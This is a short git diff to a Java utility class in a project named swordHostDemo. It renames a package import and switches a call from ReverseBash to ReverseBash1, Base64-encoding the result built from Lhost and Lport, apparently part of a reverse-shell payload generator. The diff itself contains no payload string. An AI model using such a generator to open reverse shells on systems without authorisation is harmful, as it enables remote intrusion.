@@ -1,6 +1,6 @@
 package com.swordHostDemo.utls;
 
-import com.swordHostDemo.controller.Reverse;
+import com.swordHostDemo.Controller.Reverse;
 
 import java.io.UnsupportedEncodingException;
 import java.util.Base64;
@@ -26,7 +26,7 @@ public class EnCode {
 
         String base64EecodeStr = null;
         try {
-            base64EecodeStr = Base64.getEncoder().encodeToString(Reverse.ReverseBash(Lhost, Lport).getBytes("utf-8"));
+            base64EecodeStr = Base64.getEncoder().encodeToString(Reverse.ReverseBash1(Lhost, Lport).getBytes("utf-8"));
         } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
